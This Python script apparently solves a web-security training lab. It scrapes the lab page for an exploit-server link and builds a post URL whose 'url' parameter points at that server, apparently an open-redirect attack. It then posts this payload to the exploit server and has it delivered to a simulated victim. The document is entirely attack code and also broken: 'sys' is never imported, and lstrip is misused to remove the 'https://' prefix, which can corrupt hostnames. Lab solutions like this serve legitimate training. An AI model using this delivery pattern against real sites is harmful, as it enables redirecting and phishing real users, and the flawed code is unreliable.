import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
exploit_server = sys.argv[2]
if'https://' in site or 'https://' in exploit_server:
    site = site.rstrip('/').lstrip('https://')
    exploit_server = exploit_server.rstrip('/').lstrip('https://')
url = f'{site}'
exploit_server_url = f'{exploit_server}'

s = requests.Session()
site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')
exploit_html = site_url + f'''post?postId=4&url={exploit_server_url}
'''
formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
# First Stored the data and then delivered exploit to the victim
resp = s.post(exploit_url, data=formData)
print(resp)

